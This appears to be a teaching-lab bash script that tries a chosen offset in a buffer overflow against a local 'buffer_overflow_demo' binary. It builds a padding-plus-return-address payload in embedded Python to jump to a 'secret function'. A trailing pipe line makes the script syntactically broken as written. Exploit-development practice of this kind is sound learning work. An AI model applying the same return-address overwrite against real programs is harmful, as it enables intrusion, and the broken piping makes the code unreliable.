#!/bin/bash
# Test a specific offset - useful for manual testing

if [ $# -lt 1 ]; then
    echo "Usage: $0 <offset> [address]"
    echo "Example: $0 32"
    echo "         $0 40 0x1028b4460"
    echo ""
    echo "If address is not provided, it will be extracted automatically."
    exit 1
fi

OFFSET=$1
ADDRESS=$2

echo "=== Testing Offset: $OFFSET bytes ==="
echo ""

# Get address if not provided
if [ -z "$ADDRESS" ]; then
    echo "Extracting secret function address..."
    ADDRESS=$(echo "" | ./buffer_overflow_demo 2>&1 | grep "Secret function address" | tail -1 | awk '{print $4}')
    if [ -z "$ADDRESS" ]; then
        echo "Error: Could not get address"
        exit 1
    fi
fi

echo "Secret function address: $ADDRESS"
echo "Offset: $OFFSET bytes"
echo ""
echo "Sending payload..."
echo ""

# Create and send payload
python3 << PYEOF
import struct
import sys

addr = int("$ADDRESS", 16)
payload = b'A' * $OFFSET
payload += struct.pack('<Q', addr)

sys.stdout.buffer.write(payload)
PYEOF

echo "" | ./buffer_overflow_demo 2>&1 > /dev/null  # Dummy run to get address format
python3 << PYEOF
import struct
import sys

addr = int("$ADDRESS", 16)
payload = b'A' * $OFFSET
payload += struct.pack('<Q', addr)

sys.stdout.buffer.write(payload)
PYEOF
| ./buffer_overflow_demo 2>&1

echo ""
echo "---"
echo "If you see 'SECRET FUNCTION ACTIVATED', this offset works!"
echo "If the program crashes, try a different offset."

